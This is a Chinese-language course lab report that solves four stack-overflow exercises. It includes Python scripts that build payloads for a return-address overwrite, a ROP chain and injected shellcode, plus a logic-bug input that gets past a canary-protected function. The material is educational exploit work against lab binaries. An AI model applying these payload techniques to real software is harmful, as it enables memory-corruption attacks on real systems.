# 栈溢出攻击实验报告

## 题目解决思路

### Problem 1: 
- **分析**：
  程序中的 `func` 函数定义了一个缓冲区，并使用 `strcpy` 将用户输入复制到该缓冲区中。由于没有检查输入长度，存在栈溢出漏洞。
  通过反汇编可以看到，缓冲区起始地址位于 `rbp-0x8`。
  return address 位于 `rbp+0x8`。
  因此，覆盖缓冲区 `0x8` 字节，再覆盖 preserved rbp `0x8` 字节，共 16 字节后，即可覆盖 return address。
  题目要求输出 "Yes!I like ICS!"，这由 `func1` 函数完成 (地址 `0x401216`)。
  因此 Payload 结构为：`padding(16 bytes) + address_of_func1`。

- **解决方案**：
```python
import struct

# Address of func1
func1_addr = 0x401216

# Offset to return address
# buffer (8 bytes) + saved rbp (8 bytes) = 16 bytes
padding = b'A' * 16

# Payload
payload = padding + struct.pack('<Q', func1_addr)

with open('ans1.txt', 'wb') as f:
    f.write(payload)
```
- **结果**：
  运行 `./problem1 ans1.txt` 输出：
  ```
  Do you like ICS?
  Yes!I like ICS!
  ```

### Problem 2:
- **分析**：
  题目开启了 NX 保护，无法执行栈上代码，需要使用 ROP。
  `func` 函数使用 `memcpy` 复制 0x38 (56) 字节到 `rbp-0x8`。
  偏移量同样为 16 字节到达 return address。
  利用空间为 56 - 16 = 40 字节。
  目标是调用 `func2` 并满足参数要求。`func2` 检查参数是否为 `0x3f8` (在 `%edi` 中)。
  我们需要找到 `pop rdi; ret` gadget。
  在 `pop_rdi` 函数 (`0x4012bb`) 的结尾处找到了 `5f c3` (pop rdi; ret)，地址为 `0x4012c7`。
  Payload 结构：`padding + pop_rdi_gadget + 0x3f8 + func2_addr`。
  为了解决栈对齐问题，在 chain 中加入了一个 `ret` gadget (`0x40101a`)。

- **解决方案**：
```python
import struct

# Addresses
pop_rdi = 0x4012c7
func2_addr = 0x401216
expected_arg = 0x3f8
ret_gadget = 0x40101a # Gadget to fix stack alignment

# Offset
padding = b'A' * 16

# Payload
payload = padding
payload += struct.pack('<Q', ret_gadget) 
payload += struct.pack('<Q', pop_rdi)
payload += struct.pack('<Q', expected_arg)
payload += struct.pack('<Q', func2_addr)

with open('ans2.txt', 'wb') as f:
    f.write(payload)
```
- **结果**：
  运行 `./problem2 ans2.txt` 输出：
  ```
  Do you like ICS?
  Welcome to the second level!
  Yes!I like ICS!
  ```

### Problem 3: 
- **分析**：
  `func` 函数中将当前的 `%rsp` 保存到了全局变量 `saved_rsp` (`0x403510`)。
  `jmp_xs` 函数 (`0x401334`) 实现跳转到 `saved_rsp + 0x10` 的位置。
  经计算，`saved_rsp + 0x10` 恰好是 `func` 函数中 buffer 的起始地址 (`rbp-0x20`)。
  我们可以利用这一点，将 return address 覆盖为 `jmp_xs` 的地址，从而跳转回栈上执行我们注入的 Shellcode。
  目标是调用 `func1(0x72)`。Shellcode 需设置 `%edi=0x72` 并调用 `0x401216`。

- **解决方案**：
```python
import struct

# Shellcode to call func1(0x72)
# mov $0x72, %edi
# mov $0x401216, %eax
# call %rax
shellcode = b'\xbf\x72\x00\x00\x00\xb8\x16\x12\x40\x00\xff\xd0'

# Address of jmp_xs
jmp_xs = 0x401334

# Buffer is at -0x20(%rbp)
# Return address is at 0x8(%rbp)
# Distance is 0x28 = 40 bytes
padding_len = 40 - len(shellcode)
padding = b'A' * padding_len

# Payload
payload = shellcode + padding + struct.pack('<Q', jmp_xs)

with open('ans3.txt', 'wb') as f:
    f.write(payload)
```
- **结果**：
  运行 `./problem3 ans3.txt` 输出：
  ```
  Do you like ICS?
  Now, say your lucky number is 114!
  If you do that, I will give you great scores!
  Your lucky number is 114
  ```

### Problem 4: 
- **分析**：
  **Canary 保护机制**：
  程序在 `func` 函数中使用了 Stack Canary 保护机制。
  1. **设置 Canary**：
     在函数序言部分（地址 `0x136c` 附近）：
     ```asm
     136c: 64 48 8b 04 25 28 00    mov    %fs:0x28,%rax  ; 获取随机 Canary 值
     1375: 48 89 45 f8             mov    %rax,-0x8(%rbp); 存入栈 rbp-0x8
     ```
  2. **检查 Canary**：
     在函数返回前（地址 `0x140a` 附近）：
     ```asm
     140a: 48 8b 45 f8             mov    -0x8(%rbp),%rax; 取出栈上的值
     140e: 64 48 2b 04 25 28 00    sub    %fs:0x28,%rax  ; 与原 Canary 比较
     1417: 74 05                   je     141e <func+0xc1>; 相等则跳转（正常返回）
     1419: e8 b2 fc ff ff          call   10d0 <__stack_chk_fail@plt>; 不等则报错
     ```
  
  本题虽然有 Canary，但并不需要栈溢出。漏洞在于逻辑。
  `func` 接受一个整数参数 `arg0`。
  如果 `arg0 >= 0xfffffffe` (unsigned)，进入一个循环。
  循环中 `arg0` 不断减 1，直到循环次数达到 `0xfffffffe` 次。
  循环结束后，如果 `arg0 == 1` 且 `original_arg0 == -1` (0xffffffff)，则输出 Success。
  由于 `0xffffffff - 0xfffffffe = 1`，输入 `-1` 即可满足条件并触发 Success。
  
  输入 `-1` 会导致长时间循环（约数十亿次指令），需等待几秒钟。

  **注意**：`main` 函数中使用 `scanf("%d", &money)` 读取输入。如果输入的不是数字（例如误输了字符），`scanf` 会读取失败且不消耗缓冲区字符，导致 `main` 函数进入死循环不断打印提示信息。

- **解决方案**：
  前两个问题可以回答任意非空字符串，第三个问题必须输入 `-1`。
  例如：
  ```
  zhizhi61
  yeah...
  -1
  ```
  保存为 `ans4.txt`。

- **结果**：
  运行 `./problem4 < ans4.txt` 输出：
  ```
  hi please tell me what is your name?
  hi! do you like ics?
  if you give me enough yuanshi,I will let you pass!
  your money is 4294967295
  great!I will give you great scores
  ```

## 思考与总结
通过本次实验，深入理解了栈溢出的原理以及利用方式。
Problem 1 展示了最基本的覆盖返回地址攻击。
Problem 2 展示了在 NX 开启情况下利用 ROP 绕过保护，同时也注意到了 x64 下栈对齐的重要性。
Problem 3 结合了代码注入和特定 gadget 跳转到栈上执行 shellcode，利用了程序自身的逻辑漏洞（保存 rsp）。
Problem 4 展示了 Canary 保护机制，以及通过逻辑漏洞而非内存破坏来达成攻击目的的可能性。

